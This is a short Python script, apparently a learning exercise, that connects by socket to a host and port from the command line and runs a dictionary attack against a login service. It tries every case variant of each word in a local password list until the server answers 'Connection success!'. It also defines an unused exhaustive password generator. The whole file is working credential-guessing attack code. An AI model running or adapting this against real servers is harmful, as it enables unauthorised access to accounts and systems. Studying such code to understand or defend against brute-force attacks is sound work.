import itertools
import socket
import string
import sys
from pathlib import Path


symbols = string.ascii_lowercase + string.digits


def generate_password():
    for length in range(1, len(symbols) + 1):
        for item in itertools.product(symbols, repeat=length):
            yield ''.join(item)


def read_pwd_file():
    return Path('hacking/passwords.txt').read_text().splitlines()


args = sys.argv
with socket.socket() as client_socket:
    client_socket.connect((args[1], int(args[2])))
    poss_values = read_pwd_file()
    for value in poss_values:
        attempts = map(''.join, itertools.product(*zip(value.upper(), value.lower())))
        for password in attempts:
            client_socket.send(password.encode())
            response = client_socket.recv(1024)
            if response.decode() == 'Connection success!':
                print(password)
                exit()
